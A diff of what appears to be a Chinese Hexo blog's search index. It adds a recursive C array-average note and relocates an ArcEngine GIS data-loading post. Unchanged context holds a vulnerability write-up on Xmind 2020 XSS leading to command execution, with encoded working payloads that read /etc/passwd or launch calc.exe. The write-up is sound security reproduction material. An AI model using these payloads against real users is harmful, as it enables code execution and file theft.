@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[递归求具有n个元素的整型数组R的平均值]]></title>
+    <url>%2Fposts%2F9010%2F</url>
+    <content type="text"><![CDATA[递归求具有n个元素的整型数组R的平均值今天做题的时候遇到这个不会的题，虽然题很简单单还是太菜了，记录下来，这还是问了一个小学妹之后才懂了，自卑ing… … int get_agv(int R[], int n) { if(n==1) return R[0]; else return (R[n-1] + get_agv(R, n-1)*(n-1))/n; // n-1 用来约分母(约前面一个数的分母)， 把分母写在横线的下面比较容易看出来 } void main() { int R[5] = {22,44,66,88,10}; printf("平均值: %d\n", get_agv(R, 5)); } 最后一句：return (R[n-1] + get_agv(R, n-1)*(n-1))/n;中的n-1是用来约分母的(约前面一个数的分母)，比如下面这样更直观一点 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
+      <categories>
+        <category>编程</category>
+      </categories>
+      <tags>
+        <tag>C语言题</tag>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[xmind2020存在XSS漏洞可导致命令执行]]></title>
     <url>%2Fposts%2F45828%2F</url>
     <content type="text"><![CDATA[漏洞描述Xmind2020 存在XSS漏洞，攻击者可利用该漏洞进行命令执行。由于软件允许用户以文件形式或自定义标题标题的形式存储JS代码，攻击者可以发送带有恶意JS代码的文件。用户打开文件后，从而执行攻击者预先设定好的命令。 漏洞复现测试环境：ubuntu18.04、xmind2020 1.打开xmind后，在思维导图模式下输入以下Payload： &lt;img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,99,111,110,115,116,32,123,32,115,112,97,119,110,32,125,32,61,32,114,101,113,117,105,114,101,40,34,99,104,105,108,100,95,112,114,111,99,101,115,115,34,41,59,10,99,111,110,115,116,32,99,97,116,32,61,32,115,112,97,119,110,40,34,99,97,116,34,44,32,91,34,47,101,116,99,47,112,97,115,115,119,100,34,93,41,59,10,99,97,116,46,115,116,100,111,117,116,46,111,110,40,34,100,97,116,97,34,44,32,100,97,116,97,32,61,62,32,123,10,32,32,32,32,97,108,101,114,116,40,96,115,116,100,111,117,116,58,32,36,123,100,97,116,97,125,96,41,59,10,125,41,59,60,47,115,99,114,105,112,116,62))> 解码后数据即为： //Decode Payload &lt;script> const { spawn } = require("child_process"); const cat = spawn("cat", ["/etc/passwd"]); cat.stdout.on("data", data => { alert(`stdout: ${data}`); });&lt;/script> 补充知识： // 1.str转unicode序列 var c = "&lt;script>\nvar Process = process.binding('process_wrap').Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+'='+env[key]);\nproc.spawn({file:'c:\\windows\\system32\\calc.exe',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});\n&lt;/script>" var codeArr = []; for(var i=0;i&lt;c.length;i++){ codeArr.push(c.charCodeAt(i)); } console.log(codeArr); // 2.unicode序列还原为str var n = String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 10, 118, 97, 114, 32, 80, 114, 111, 99, 101, 115, 115, 32, 61, 32, 112, 114, 111, 99, 101, 115, 115, 46, 98, 105, 110, 100, 105, 110, 103, 40, 39, 112, 114, 111, 99, 101, 115, 115, 95, 119, 114, 97, 112, 39, 41, 46, 80, 114, 111, 99, 101, 115, 115, 59, 10, 118, 97, 114, 32, 112, 114, 111, 99, 32, 61, 32, 110, 101, 119, 32, 80, 114, 111, 99, 101, 115, 115, 40, 41, 59, 10, 112, 114, 111, 99, 46, 111, 110, 101, 120, 105, 116, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 97, 44, 98, 41, 32, 123, 125, 59, 10, 118, 97, 114, 32, 101, 110, 118, 32, 61, 32, 112, 114, 111, 99, 101, 115, 115, 46, 101, 110, 118, 59, 10, 118, 97, 114, 32, 101, 110, 118, 95, 32, 61, 32, 91, 93, 59, 10, 102, 111, 114, 32, 40, 118, 97, 114, 32, 107, 101, 121, 32, 105, 110, 32, 101, 110, 118, 41, 32, 101, 110, 118, 95, 46, 112, 117, 115, 104, 40, 107, 101, 121, 43, 39, 61, 39, 43, 101, 110, 118, 91, 107, 101, 121, 93, 41, 59, 10, 112, 114, 111, 99, 46, 115, 112, 97, 119, 110, 40, 123, 102, 105, 108, 101, 58, 39, 99, 58, 92, 119, 105, 110, 100, 111, 119, 115, 92, 115, 121, 115, 116, 101, 109, 51, 50, 92, 99, 97, 108, 99, 46, 101, 120, 101, 39, 44, 99, 119, 100, 58, 110, 117, 108, 108, 44, 119, 105, 110, 100, 111, 119, 115, 86, 101, 114, 98, 97, 116, 105, 109, 65, 114, 103, 117, 109, 101, 110, 116, 115, 58, 102, 97, 108, 115, 101, 44, 100, 101, 116, 97, 99, 104, 101, 100, 58, 102, 97, 108, 115, 101, 44, 101, 110, 118, 80, 97, 105, 114, 115, 58, 101, 110, 118, 95, 44, 115, 116, 100, 105, 111, 58, 91, 123, 116, 121, 112, 101, 58, 39, 105, 103, 110, 111, 114, 101, 39, 125, 44, 123, 116, 121, 112, 101, 58, 39, 105, 103, 110, 111, 114, 101, 39, 125, 44, 123, 116, 121, 112, 101, 58, 39, 105, 103, 110, 111, 114, 101, 39, 125, 93, 125, 41, 59, 10, 60, 47, 115, 99, 114, 105, 112, 116, 62); console.log(n); 2.点击大纲。在大纲模式下，选中payload，按下Ctrl+C快捷键触发该Payload，执行calc命令。 修复建议该漏洞在大纲模式下触发，Xmind 2020的使用者，谨慎打开Xmind的大纲模式。 参考Xmind 2020 - XSS to RCE - Multiple webapps Exploit (exploit-db.com) 漏洞情报 | Xmind 2020 XSS漏洞导致命令执行 (qq.com) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
@@ -296,9 +308,9 @@
         <category>渗透测试</category>
       </categories>
       <tags>
+        <tag>漏洞复现</tag>
         <tag>Fastjson反序列化</tag>
         <tag>靶场实验</tag>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -512,9 +524,9 @@
         <category>Linux</category>
       </categories>
       <tags>
+        <tag>防火墙</tag>
         <tag>iptables</tag>
         <tag>NAT</tag>
-        <tag>防火墙</tag>
       </tags>
   </entry>
   <entry>
@@ -646,8 +658,8 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>ubuntu server</tag>
         <tag>邮件服务</tag>
+        <tag>ubuntu server</tag>
       </tags>
   </entry>
   <entry>
@@ -658,8 +670,8 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>聊天服务</tag>
         <tag>ubuntu server</tag>
+        <tag>聊天服务</tag>
       </tags>
   </entry>
   <entry>
@@ -729,8 +741,8 @@
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>Atlassian Crowd</tag>
         <tag>未授权访问</tag>
+        <tag>Atlassian Crowd</tag>
         <tag>远程命令执行</tag>
       </tags>
   </entry>
@@ -742,8 +754,8 @@
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>未授权访问</tag>
         <tag>CouchDB</tag>
+        <tag>未授权访问</tag>
         <tag>命令执行</tag>
         <tag>CVE-2017-12635</tag>
         <tag>CVE-2017-12636</tag>
@@ -2031,19 +2043,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[ArcEngine加载数据]]></title>
-    <url>%2Fposts%2F980b1709%2F</url>
-    <content type="text"><![CDATA[加载shapefile数据F1 使用AddShapefile方法 private void 添加ShapefileToolStripMenuItem_Click(object sender, EventArgs e) { try { //同样实例化一个打开文件的类对象 OpenFileDialog open = new OpenFileDialog(); // 如果打开正确 if (open.ShowDialog() == DialogResult.OK) { //首先定义一个空的路径 string filePath = string.Empty; // 然后定义一个空的文件名 string file = string.Empty; // 获取完整的文件路径 string filedir = open.FileName; //如果路径为空，嘛都不返回 if (fileDir == "") return; // 对完整路径进行截取 获取最后一个斜杠的索引 int pos = filedir.LastIndexOf('\\'); // 截取字符串 路径 filePath =filedir.Substring(0, pos); //文件名 file = filedir.Substring(pos+1); // 需要两个参数 axMapControl1.AddShapeFile(filePath, file); //刷新 axMapControl1.ActiveView.Refresh(); } } catch (Exception) { MessageBox.Show("请打开正确的文档!", "提醒",MessageBoxButtons.OK, MessageBoxIcon.Error ); } } F2 使用工作空间思路: 创建ShapefileWorkspaceFactory实例，使用OpenFromFile方法打开工作区。 创建FeatureLayer的实例，定义数据集。 使用AddLayer方法加载数据。 using ESRI.ArcGIS.Geodatabase; using ESRI.ArcGIS.DataSourcesFile; using ESRI.ArcGIS.DataSourcesRaster; OpenFileDialog open = new OpenFileDialog(); open.CheckFileExists = true; open.Title = "打开Shape文件"; open.RestoreDirectory = true; open.Filter = "Shape文件(*.shp)|**.shp"; open.RestoreDirectory = true; open.ShowDialog(); //获取完整的文件路径 :path+name string fileDir = open.FileName; //路径为空不返回 if (fileDir == "") return; // 对完整路径进行截取 int pos = fileDir.LastIndexOf("\\"); // 路径 string pfilePath = fileDir.Substring(0, pos); //文件名 string file = fileDir.Substring(pos + 1); //实例化ShapefileWorkspaceFactory工作空间，打开Shape文件 IWorkspaceFactory pWsFactory = new ShapefileWorkspaceFactoryClass(); //强制转换 打开路径 IFeatureWorkspace pWorkSpace = pWsFactory.OpenFromFile(pfilePath, 0) as IFeatureWorkspace; //创建并实例化要素类 IFeatureClass pFeatureClass = pWorkSpace.OpenFeatureClass(file); IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); 加载栅格数据主要用到以下2个接口： IRasterPyramid3接口提供对栅格数据集的金字塔属性的访问 Present属性–判断栅格数据集是否存在金字塔 Create方法–为栅格数据集创建金字塔 IRasterLayer接口继承自ILayer接口 CreateFromDataset方法–从已有的栅格数据集对象创建图层 CreateFromRaster方法–从已有的栅格对象创建图层 Raster属性–获取IRasterLayer接口中的Raster对象 DisplayResolutionFactor属性–设置栅格数据的分辨率 1.直接用IRasterLayer接口打开一个栅格文件并加载到地图控件 IRasterLayer rasterLayer = new RasterLayerClass(); rasterLayer.CreateFromFilePath(fileName); // fileName指存本地的栅格文件路径 axMapControl1.AddLayer(rasterLayer, 0); 2.思路: (1)使用OpenFromFile方法获得栅格文件的工作区 (2)使用OpenRasterDataset方法获得栅格文件的数据集 (3)判断栅格数据集是否具有金字塔 (4)创建pRasterLayer，并定义数据集 (5)使用AddLayer方法加载数据` OpenFileDialog pOpenFileDialog = new OpenFileDialog(); pOpenFileDialog.CheckFileExists = true; pOpenFileDialog.Title = "加载栅格数据"; pOpenFileDialog.Filter = "栅格文件(*.*)|*.bmp;*.tif;*.jpg;*.img;|BMP(*.bmp)|*.bmp;|TIF(*.tif)|*.tif;|JPG(*.jpg)|*.jpg;|IMG(*.img)|*.img"; pOpenFileDialog.ShowDialog(); //获取名字 string pRasterFilename = pOpenFileDialog.FileName; if (pRasterFilename == "") return; // IO里面获取文件名字与路径的固定用法 string pPath = System.IO.Path.GetDirectoryName(pRasterFilename); string pFileName = System.IO.Path.GetFileName(pRasterFilename); IWorkspaceFactory pWorkspaceFactory = new RasterWorkspaceFactory(); IWorkspace pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0); IRasterWorkspace pRasterWorkspace = pWorkspace as IRasterWorkspace; IRasterDataset pRasterDataset = pRasterWorkspace.OpenRasterDataset(pFileName); //影像金字塔的判断与创建 IRasterPyramid3 pRasPyramid; pRasPyramid = pRasterDataset as IRasterPyramid3; if (pRasPyramid != null) { if (!(pRasPyramid.Present)) { //创建金字塔 pRasPyramid.Create(); } } IRaster pRaster; pRaster = pRasterDataset.CreateDefaultRaster(); IRasterLayer pRasterLayer; pRasterLayer = new RasterLayerClass(); pRasterLayer.CreateFromRaster(pRaster); ILayer pLayer = pRasterLayer as ILayer; mainMapControl.AddLayer(pLayer, 0); ### 加载CAD数据 ###### 1.作为矢量图层加载 === 1)分图层加载 IWorkspaceFactory pWorkspaceFactory; IFeatureWorkspace pFeatureWorkspace; pWorkspaceFactory = new CadWorkspaceFactory(); pFeatureWorkspace = (IFeatureWorkspace)pWorkspaceFactory.OpenFromFile(pPath, 0); //加载CAD文件中的线文件 IFeatureClass pFeatureClass = pFeatureWorkspace.OpenFeatureClass(pFileName + ":polyline"); IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFileName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); ###### 2.作为矢量图层加载 === 1)整幅图加载 //打开CAD数据集 IWorkspaceFactory pWorkspaceFactory = new CadWorkspaceFactoryClass(); //using ESRI.ArcGIS.DataSourcesFile; IFeatureWorkspace pFeatureWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0) as IFeatureWorkspace; //打开一个要素集 IFeatureDataset pFeatureDataset = pFeatureWorkspace.OpenFeatureDataset(pFileName); // IFeatureContainer可以管理IFeatureDataset中的每个要素类 IFeatureClassContainer pFeatureContainer = (IFeatureClassContainer)pFeatureDataset; //对CAD文件中的要素进行遍历处理 for (int i = 0; i &lt; pFeatureContainer.ClassCount; i++) { IFeatureClass pFeatureClass = pFeatureContainer.get_Class(i); //如果是注记， 则添加注记层 if (pFeatureClass.FeatureType == esriFeatureType.esriFTCoverageAnnotation) { IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); } else //如果是点线面则添加要素层 { IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); } mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); } ###### F3.作为栅格图层加载 IWorkspaceFactory pWorkspaceFactory; IWorkspace pWorkspace; ICadDrawingDataset pCadDrawingDataset; ICadDrawingWorkspace pCadDrawingWorkspace; ICadLayer pCadLayer; pWorkspaceFactory = new CadWorkspaceFactoryClass(); pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0); pCadDrawingWorkspace = (ICadDrawingWorkspace)pWorkspace; //获得CAD文件的数据集 pCadDrawingDataset = pCadDrawingWorkspace.OpenCadDrawingDataset(pFileName); pCadLayer = new CadLayerClass(); pCadLayer.CadDrawingDataset = pCadDrawingDataset; mainMapControl.Map.AddLayer(pCadLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); ###### 加载个人地理数据库 ###### 加载文件地理数据库 ` document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
-      <categories>
-        <category>GIS</category>
-      </categories>
-      <tags>
-        <tag>ArcEngine</tag>
-        <tag>GIS</tag>
-        <tag>C#</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[ArcgisEngine实现地图浏览]]></title>
     <url>%2Fposts%2F1a728c4f%2F</url>
     <content type="text"><![CDATA[全图 private void FullExtentTSButton_Click(object sender, EventArgs e) { mainMapControl.Extent = mainMapControl.FullExtent; } 等比例放大 private void btnZoomInStep_Click(object sender, EventArgs e) { IEnvelope pEnvelope; pEnvelope = mainMapControl.Extent; pEnvelope.Expand(0.5, 0.5, true); //放大2倍 mainMapControl.Extent = pEnvelope; mainMapControl.ActiveView.Refresh(); } 等比例缩小 private void btnZoomIOutStep_Click(object sender, EventArgs e) { IActiveView pActiveView = mainMapControl.ActiveView; IPoint centerPoint = new PointClass(); centerPoint.PutCoords((pActiveView.Extent.XMin + pActiveView.Extent.XMax) / 2, (pActiveView.Extent.YMax + pActiveView.Extent.YMin) / 2); IEnvelope envlop = pActiveView.Extent; envlop.Expand(1.5, 1.5, true); //与放大的区别在于Expand的参数不同 pActiveView.Extent.CenterAt(centerPoint); pActiveView.Extent = envlop; pActiveView.Refresh(); //如果觉得乱的话，直接修改放大的参数也将就可以 非万不得已不用 //IEnvelope pEnvelope; //pEnvelope = mainMapControl.Extent; //pEnvelope.Expand(1.5, 1.5, true); //放大2倍 //mainMapControl.Extent = pEnvelope; //mainMapControl.ActiveView.Refresh(); } 上一视图 // 定义全局变量 IExtentStack pExtentStack; private void PreViewTSButton_Click(object sender, EventArgs e) { pExtentStack = mainMapControl.ActiveView.ExtentStack; //判断是否可以回到前一视图，第一个视图没有前视图 if (pExtentStack.CanUndo()) { pExtentStack.Undo(); //撤销到上一视图范围 NextViewTSButton.Enabled = true; //后一视图可以使用 if (!pExtentStack.CanUndo()) { PreViewTSButton.Enabled = false; //前一视图不能使用 } } mainMapControl.ActiveView.Refresh(); } 下一视图 private void NextViewTSButton_Click(object sender, EventArgs e) { pExtentStack = mainMapControl.ActiveView.ExtentStack; //判断是否可以回到后一视图，最后一个视图没有后一视图 if (pExtentStack.CanRedo()) //如果可以重做下一视图 { pExtentStack.Redo(); //重做到下一视图 PreViewTSButton.Enabled = true; //上一视图按钮可以使用 if (!pExtentStack.CanRedo()) //如果不可以重做下一视图 { NextViewTSButton.Enabled = false; //下一视图不能用 } } mainMapControl.ActiveView.Refresh(); } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
@@ -2065,6 +2064,19 @@
       <tags>
         <tag>ArcEngine</tag>
         <tag>GIS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[ArcEngine加载数据]]></title>
+    <url>%2Fposts%2F980b1709%2F</url>
+    <content type="text"><![CDATA[加载shapefile数据F1 使用AddShapefile方法 private void 添加ShapefileToolStripMenuItem_Click(object sender, EventArgs e) { try { //同样实例化一个打开文件的类对象 OpenFileDialog open = new OpenFileDialog(); // 如果打开正确 if (open.ShowDialog() == DialogResult.OK) { //首先定义一个空的路径 string filePath = string.Empty; // 然后定义一个空的文件名 string file = string.Empty; // 获取完整的文件路径 string filedir = open.FileName; //如果路径为空，嘛都不返回 if (fileDir == "") return; // 对完整路径进行截取 获取最后一个斜杠的索引 int pos = filedir.LastIndexOf('\\'); // 截取字符串 路径 filePath =filedir.Substring(0, pos); //文件名 file = filedir.Substring(pos+1); // 需要两个参数 axMapControl1.AddShapeFile(filePath, file); //刷新 axMapControl1.ActiveView.Refresh(); } } catch (Exception) { MessageBox.Show("请打开正确的文档!", "提醒",MessageBoxButtons.OK, MessageBoxIcon.Error ); } } F2 使用工作空间思路: 创建ShapefileWorkspaceFactory实例，使用OpenFromFile方法打开工作区。 创建FeatureLayer的实例，定义数据集。 使用AddLayer方法加载数据。 using ESRI.ArcGIS.Geodatabase; using ESRI.ArcGIS.DataSourcesFile; using ESRI.ArcGIS.DataSourcesRaster; OpenFileDialog open = new OpenFileDialog(); open.CheckFileExists = true; open.Title = "打开Shape文件"; open.RestoreDirectory = true; open.Filter = "Shape文件(*.shp)|**.shp"; open.RestoreDirectory = true; open.ShowDialog(); //获取完整的文件路径 :path+name string fileDir = open.FileName; //路径为空不返回 if (fileDir == "") return; // 对完整路径进行截取 int pos = fileDir.LastIndexOf("\\"); // 路径 string pfilePath = fileDir.Substring(0, pos); //文件名 string file = fileDir.Substring(pos + 1); //实例化ShapefileWorkspaceFactory工作空间，打开Shape文件 IWorkspaceFactory pWsFactory = new ShapefileWorkspaceFactoryClass(); //强制转换 打开路径 IFeatureWorkspace pWorkSpace = pWsFactory.OpenFromFile(pfilePath, 0) as IFeatureWorkspace; //创建并实例化要素类 IFeatureClass pFeatureClass = pWorkSpace.OpenFeatureClass(file); IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); 加载栅格数据主要用到以下2个接口： IRasterPyramid3接口提供对栅格数据集的金字塔属性的访问 Present属性–判断栅格数据集是否存在金字塔 Create方法–为栅格数据集创建金字塔 IRasterLayer接口继承自ILayer接口 CreateFromDataset方法–从已有的栅格数据集对象创建图层 CreateFromRaster方法–从已有的栅格对象创建图层 Raster属性–获取IRasterLayer接口中的Raster对象 DisplayResolutionFactor属性–设置栅格数据的分辨率 1.直接用IRasterLayer接口打开一个栅格文件并加载到地图控件 IRasterLayer rasterLayer = new RasterLayerClass(); rasterLayer.CreateFromFilePath(fileName); // fileName指存本地的栅格文件路径 axMapControl1.AddLayer(rasterLayer, 0); 2.思路: (1)使用OpenFromFile方法获得栅格文件的工作区 (2)使用OpenRasterDataset方法获得栅格文件的数据集 (3)判断栅格数据集是否具有金字塔 (4)创建pRasterLayer，并定义数据集 (5)使用AddLayer方法加载数据` OpenFileDialog pOpenFileDialog = new OpenFileDialog(); pOpenFileDialog.CheckFileExists = true; pOpenFileDialog.Title = "加载栅格数据"; pOpenFileDialog.Filter = "栅格文件(*.*)|*.bmp;*.tif;*.jpg;*.img;|BMP(*.bmp)|*.bmp;|TIF(*.tif)|*.tif;|JPG(*.jpg)|*.jpg;|IMG(*.img)|*.img"; pOpenFileDialog.ShowDialog(); //获取名字 string pRasterFilename = pOpenFileDialog.FileName; if (pRasterFilename == "") return; // IO里面获取文件名字与路径的固定用法 string pPath = System.IO.Path.GetDirectoryName(pRasterFilename); string pFileName = System.IO.Path.GetFileName(pRasterFilename); IWorkspaceFactory pWorkspaceFactory = new RasterWorkspaceFactory(); IWorkspace pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0); IRasterWorkspace pRasterWorkspace = pWorkspace as IRasterWorkspace; IRasterDataset pRasterDataset = pRasterWorkspace.OpenRasterDataset(pFileName); //影像金字塔的判断与创建 IRasterPyramid3 pRasPyramid; pRasPyramid = pRasterDataset as IRasterPyramid3; if (pRasPyramid != null) { if (!(pRasPyramid.Present)) { //创建金字塔 pRasPyramid.Create(); } } IRaster pRaster; pRaster = pRasterDataset.CreateDefaultRaster(); IRasterLayer pRasterLayer; pRasterLayer = new RasterLayerClass(); pRasterLayer.CreateFromRaster(pRaster); ILayer pLayer = pRasterLayer as ILayer; mainMapControl.AddLayer(pLayer, 0); ### 加载CAD数据 ###### 1.作为矢量图层加载 === 1)分图层加载 IWorkspaceFactory pWorkspaceFactory; IFeatureWorkspace pFeatureWorkspace; pWorkspaceFactory = new CadWorkspaceFactory(); pFeatureWorkspace = (IFeatureWorkspace)pWorkspaceFactory.OpenFromFile(pPath, 0); //加载CAD文件中的线文件 IFeatureClass pFeatureClass = pFeatureWorkspace.OpenFeatureClass(pFileName + ":polyline"); IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFileName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); ###### 2.作为矢量图层加载 === 1)整幅图加载 //打开CAD数据集 IWorkspaceFactory pWorkspaceFactory = new CadWorkspaceFactoryClass(); //using ESRI.ArcGIS.DataSourcesFile; IFeatureWorkspace pFeatureWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0) as IFeatureWorkspace; //打开一个要素集 IFeatureDataset pFeatureDataset = pFeatureWorkspace.OpenFeatureDataset(pFileName); // IFeatureContainer可以管理IFeatureDataset中的每个要素类 IFeatureClassContainer pFeatureContainer = (IFeatureClassContainer)pFeatureDataset; //对CAD文件中的要素进行遍历处理 for (int i = 0; i &lt; pFeatureContainer.ClassCount; i++) { IFeatureClass pFeatureClass = pFeatureContainer.get_Class(i); //如果是注记， 则添加注记层 if (pFeatureClass.FeatureType == esriFeatureType.esriFTCoverageAnnotation) { IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); } else //如果是点线面则添加要素层 { IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); } mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); } ###### F3.作为栅格图层加载 IWorkspaceFactory pWorkspaceFactory; IWorkspace pWorkspace; ICadDrawingDataset pCadDrawingDataset; ICadDrawingWorkspace pCadDrawingWorkspace; ICadLayer pCadLayer; pWorkspaceFactory = new CadWorkspaceFactoryClass(); pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0); pCadDrawingWorkspace = (ICadDrawingWorkspace)pWorkspace; //获得CAD文件的数据集 pCadDrawingDataset = pCadDrawingWorkspace.OpenCadDrawingDataset(pFileName); pCadLayer = new CadLayerClass(); pCadLayer.CadDrawingDataset = pCadDrawingDataset; mainMapControl.Map.AddLayer(pCadLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); ###### 加载个人地理数据库 ###### 加载文件地理数据库 ` document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
+      <categories>
+        <category>GIS</category>
+      </categories>
+      <tags>
+        <tag>ArcEngine</tag>
+        <tag>GIS</tag>
+        <tag>C#</tag>
       </tags>
   </entry>
   <entry>
